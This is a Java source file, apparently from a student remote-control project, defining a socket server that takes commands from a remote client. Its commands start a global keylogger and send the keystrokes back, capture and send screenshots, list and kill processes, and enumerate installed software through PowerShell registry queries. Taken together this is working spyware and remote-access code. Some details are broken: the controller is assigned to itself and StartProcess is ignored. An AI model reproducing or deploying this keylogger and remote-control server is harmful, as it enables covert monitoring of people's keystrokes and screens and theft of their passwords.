package model;

import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;

import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.GlobalScreen;

import controller.Controller;

import javax.imageio.ImageIO;

public class Server {
    private enum Status {
        STOP,
        SUSPEND,
        RUNNING,
    };
    private ServerSocket serverSock;
    private Socket clientSock;
    private InputStream inputStream;
    private OutputStream outputStream;
    private KeyLogger keyLogger;
    private Controller controller;
    private Status status;
    private boolean isHooked;
    private ScreenShot screenShot;

    public Server(int port, int backlog) {
        this.controller = controller;
        createServerSocket(port, backlog);
        keyLogger = new KeyLogger();

        status = Status.STOP;
        isHooked = false;

        // Register NativeHook for KeyLogger

        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        screenShot = new ScreenShot();
    }

    public void run() {
        status = Status.RUNNING;

        new Thread(new Runnable() {
            public void run() {
                acceptClient();

                while(status == Status.RUNNING) {
                    byte[] buffer = new byte[128];
                    try {
                        inputStream.read(buffer);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    String action = new String(buffer).trim();

                    switch (action) {
                        case ("Hook"):
                        case ("Unhook"):
                        case ("Print"): {
                            handleKeyLogging(action);
                            break;
                        }
                        case ("ScreenShot"):
                        {
                            handleScreenShot(action);
                            break;
                        }

                        case ("ListProcess"):
                        case ("StopProcess"):
                        case ("StartProcess"):
                        {
                            handleProcess(action);
                            break;
                        }

                        case ("ListApp"):
                        {
                            handleApp(action);
                            break;
                        }

                        case ("Exit"): {
                            status = Status.STOP;
                            break;
                        }
                    }
                }

                cleanup();
            }
        }).start();

    }

    public void addController(Controller controller) {
        this.controller = controller;
    }

    private void handleApp(String action)
    {
        notifyController(action);
        String dir1 = "HKLM:/Software/Microsoft/Windows/CurrentVersion/Uninstall/*";
        String dir2 = "HKCU:/Software/Microsoft/Windows/CurrentVersion/Uninstall/*";
        String dir3 = "HKLM:/Software/Wow6432Node/Microsoft/Windows/CurrentVersion/Uninstall/*";
        // Thư mục này máy có máy không
        String dir4 = "HKCU:/Software/Wow6432Node/Microsoft/Windows/CurrentVersion/Uninstall/*";
        // Bỏ câu lệnh sau dấu | để thấy nhiều trường tùy chọn hơn, sau đó thêm sau Selec-object để chọn hiện thị các trường đó
        String custom = "|Select-Object DisplayName, DisplayIcon  |Where-Object SystemComponent -ne 1|Format-Table";
        // Gồm cả những App hệ thống
        String command = "powershell.exe -command \" Get-ItemProperty " + dir1 + "," + dir2 + "," + dir3 + " -ErrorAction SilentlyContinue" + custom + "\"";
        String diffCommand = "powershell.exe -command \"$table = foreach ($UKey in 'HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/*','HKLM:/SOFTWARE/Wow6432node/Microsoft/Windows/CurrentVersion/Uninstall/*','HKCU:SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/*','HKCU:/SOFTWARE/Wow6432node/Microsoft/Windows/CurrentVersion/Uninstall/*'){foreach ($Product in (Get-ItemProperty $UKey -ErrorAction SilentlyContinue)){if($Product.DisplayName -and $Product.SystemComponent -ne 1){new-object psobject -Property @{Name = $Product.DisplayName; Location = $Product.DisplayIcon}}}} $table | Out-String -Width 4096 | Format-Table -Autosize\"";

        try
        {
            Process powerShellProcess = Runtime.getRuntime().exec(command);
            String line;
            byte[] buffer = new byte[1024];


            BufferedReader appReader = new BufferedReader(new InputStreamReader(powerShellProcess.getInputStream()));

            while ((line = appReader.readLine()) != null) {
                System.out.println(line);
                System.out.println();
                System.out.println();
                buffer = line.getBytes(StandardCharsets.UTF_8);
                outputStream.write(buffer);
            }
        }
        catch (IOException ioE)
        {
            ioE.printStackTrace();
        }
    }

    private void handleProcess(String action)
    {
        notifyController(action);

        switch (action)
        {
            case ("ListProcess"):
            {
                processModel.listProcess();
                break;
            }
            case ("StopProcess"):
            {
                processModel.stopProcess();
                break;
            }
        }
        String line;
    }

    private void handleScreenShot(String action)
    {
        notifyController(action);
        String e = screenShot.takeScreenShot();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        BufferedImage image = screenShot.getImage();
        try
        {
            ImageIO.write(image, "jpg", byteArrayOutputStream);
            outputStream.write(byteArrayOutputStream.toByteArray());
            outputStream.flush();
        }
        catch (IOException ioE)
        {
            ioE.printStackTrace();
        }
    }

    private void handleKeyLogging(String action) {
        notifyController(action);
        switch(action) {
            case ("Hook"): {
                if (isHooked == false) {
                    GlobalScreen.addNativeKeyListener(keyLogger);
                    isHooked = true;
                }
                break;
            }
            case ("Unhook"): {
                if (isHooked == true) {
                    GlobalScreen.removeNativeKeyListener(keyLogger);
                    keyLogger.clearLogs();
                    isHooked = false;
                }
                break;
            }
            case ("Print"): {
                String out = "";
                for (int i = 0; i < keyLogger.logs.size(); i++) {
                    out += keyLogger.logs.get(i);
                }
                byte[] tmp = out.getBytes();

                try {
                    outputStream.write(tmp);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            }
        }
    }

    private void notifyController(String action) {
        controller.handleAction(action);
    }

    private void acceptClient() {
        try {
            clientSock = serverSock.accept();
            inputStream = clientSock.getInputStream();
            outputStream = clientSock.getOutputStream();

            processModel = new ProcessModel(inputStream, outputStream);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void createServerSocket(int port, int backlog) {
        try {
            serverSock = new ServerSocket(port, backlog);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void cleanup() {
        try {
            GlobalScreen.unregisterNativeHook();
            serverSock.close();
            clientSock.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private ProcessModel processModel;
}
